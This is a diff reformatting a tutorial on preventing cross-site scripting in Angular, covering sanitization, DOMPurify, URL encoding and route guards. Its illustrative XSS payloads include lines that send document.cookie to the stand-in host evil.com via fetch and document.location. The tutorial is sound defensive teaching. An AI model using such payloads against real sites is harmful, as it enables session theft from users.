@@ -21,14 +21,17 @@ https://example.com/search?q=<script>document.location='https://evil.com?c='+doc
 
 ```html
 <!-- Saved comment content, rendered server-side without encoding -->
-Nice post! <script>fetch('https://evil.com?c=' + document.cookie)</script>
+Nice post!
+<script>
+  fetch("https://evil.com?c=" + document.cookie);
+</script>
 ```
 
 **DOM-based XSS** stays entirely on the client. No server involvement needed. The page's own JavaScript reads attacker-controlled data and writes it directly to the DOM.
 
 ```javascript
 // Attacker sends: https://example.com/#<img src=x onerror=alert(document.cookie)>
-document.getElementById('message').innerHTML = location.hash.slice(1);
+document.getElementById("message").innerHTML = location.hash.slice(1);
 ```
 
 The common thread: a trust boundary is crossed. Data treated as a string gets interpreted as code.
@@ -52,7 +55,7 @@ Angular's template compiler provides meaningful protection by default.
 
 ```typescript
 // This is outside Angular's control
-document.getElementById('output')!.innerHTML = userInput; // XSS
+document.getElementById("output")!.innerHTML = userInput; // XSS
 ```
 
 **Property bindings to sensitive sinks are sanitized.** Angular recognizes security-sensitive contexts and strips unsafe content before it reaches the DOM. This applies to `[innerHTML]`, `[href]`, `[src]`, and `[style]`.
@@ -62,14 +65,14 @@ document.getElementById('output')!.innerHTML = userInput; // XSS
   template: `
     <div [innerHTML]="userHtml"></div>
     <a [href]="userLink">click</a>
-  `
+  `,
 })
 export class ExampleComponent {
   // Angular sanitizes this: strips <script>, event handlers, javascript: URLs
-  userHtml = '<b>bold</b><script>alert(1)</script>';
+  userHtml = "<b>bold</b><script>alert(1)</script>";
 
   // Angular sanitizes this: javascript:alert(1) becomes unsafe:javascript:alert(1)
-  userLink = 'javascript:alert(1)';
+  userLink = "javascript:alert(1)";
 }
 ```
 
@@ -82,19 +85,19 @@ You will see a warning in the console when Angular sanitizes something. That war
 Sometimes you have HTML that must be rendered as HTML. A CMS, a markdown processor, a rich text editor. If the content is genuinely yours and you control the pipeline end-to-end, bypassing sanitization is legitimate.
 
 ```typescript
-import { Component, inject } from '@angular/core';
-import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
+import { Component, inject } from "@angular/core";
+import { DomSanitizer, SafeHtml } from "@angular/platform-browser";
 
 @Component({
-  selector: 'app-article',
-  template: `<div [innerHTML]="safeContent"></div>`
+  selector: "app-article",
+  template: `<div [innerHTML]="safeContent"></div>`,
 })
 export class ArticleComponent {
   private sanitizer = inject(DomSanitizer);
 
   // Only use this for content you own and control
   safeContent: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(
-    this.articleService.getRenderedHtml()
+    this.articleService.getRenderedHtml(),
   );
 }
 ```
@@ -105,7 +108,7 @@ If you are storing user-generated HTML, sanitize it server-side before it touche
 
 ```typescript
 // Server-side (Node.js) before saving to DB
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 const clean = DOMPurify.sanitize(userHtml);
 await db.comments.insert({ content: clean });
 
@@ -138,22 +141,22 @@ const url = `/api/search?q=${encodeURIComponent(userInput)}`;
 When using Angular's `HttpClient`, pass query parameters through the `params` option rather than interpolating them. HttpClient encodes them correctly for you.
 
 ```typescript
-import { HttpClient, HttpParams } from '@angular/common/http';
-import { inject } from '@angular/core';
+import { HttpClient, HttpParams } from "@angular/common/http";
+import { inject } from "@angular/core";
 
 const http = inject(HttpClient);
 
 // Angular encodes userInput automatically
-http.get('/api/search', {
-  params: new HttpParams().set('q', userInput)
+http.get("/api/search", {
+  params: new HttpParams().set("q", userInput),
 });
 ```
 
 One thing to know about the two encoding functions: `encodeURI` is designed for full URLs and intentionally leaves `/`, `?`, `&`, `#`, and `:` unencoded. That makes it wrong for encoding parameter values. Always use `encodeURIComponent` for individual values inside a URL.
 
 ```typescript
-encodeURI('hello/world?foo=bar');        // 'hello/world?foo=bar'  (slashes untouched)
-encodeURIComponent('hello/world?foo=bar'); // 'hello%2Fworld%3Ffoo%3Dbar'  (fully encoded)
+encodeURI("hello/world?foo=bar"); // 'hello/world?foo=bar'  (slashes untouched)
+encodeURIComponent("hello/world?foo=bar"); // 'hello%2Fworld%3Ffoo%3Dbar'  (fully encoded)
 ```
 
 ## Validating Route Parameters
@@ -165,15 +168,15 @@ Use a functional guard to validate route parameters before the component activat
 **Numeric ID:**
 
 ```typescript
-import { inject } from '@angular/core';
-import { CanActivateFn, Router } from '@angular/router';
+import { inject } from "@angular/core";
+import { CanActivateFn, Router } from "@angular/router";
 
 export const numericIdGuard: CanActivateFn = (route) => {
   const router = inject(Router);
-  const id = route.paramMap.get('id');
+  const id = route.paramMap.get("id");
 
   if (!id || !/^\d+$/.test(id)) {
-    return router.createUrlTree(['/not-found']);
+    return router.createUrlTree(["/not-found"]);
   }
 
   return true;
@@ -187,10 +190,10 @@ const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{
 
 export const uuidGuard: CanActivateFn = (route) => {
   const router = inject(Router);
-  const id = route.paramMap.get('id');
+  const id = route.paramMap.get("id");
 
   if (!id || !UUID_PATTERN.test(id)) {
-    return router.createUrlTree(['/not-found']);
+    return router.createUrlTree(["/not-found"]);
   }
 
   return true;
@@ -202,10 +205,10 @@ Register the guard in your route definition:
 ```typescript
 const routes: Routes = [
   {
-    path: 'users/:id',
+    path: "users/:id",
     component: UserDetailComponent,
-    canActivate: [numericIdGuard]
-  }
+    canActivate: [numericIdGuard],
+  },
 ];
 ```
 
